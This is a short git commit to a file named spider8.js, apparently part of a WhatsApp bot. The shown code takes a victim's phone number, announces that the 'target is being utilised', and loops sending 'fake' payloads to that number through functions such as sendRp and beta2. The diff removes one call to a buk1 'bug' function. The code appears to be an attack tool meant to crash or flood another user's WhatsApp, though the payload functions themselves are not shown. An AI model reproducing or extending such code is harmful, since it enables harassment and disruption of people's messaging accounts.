4a3cbb0c9fd200dcab2716c732155ea7e7cab39f
King Sam <141226873+Samue-l1@users.noreply.github.com>
2024-10-20 17:24:33 +0300

    Update spider8.js

--- spider8.js
+++ spider8.js
@@ -512,7 +512,6 @@ if (!q) return reply(`Example: ${prefix + command} 2547×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(`Wait Your Target is being Utilised`)
 for (let i = 0; i < 2; i++) {
-await buk1(sam, target, "SPIDER", 1020000, ptcp = true);
 await sendRp(target, fake)
 await sendRp(target, fake)
 await beta2(sam, target, fake)
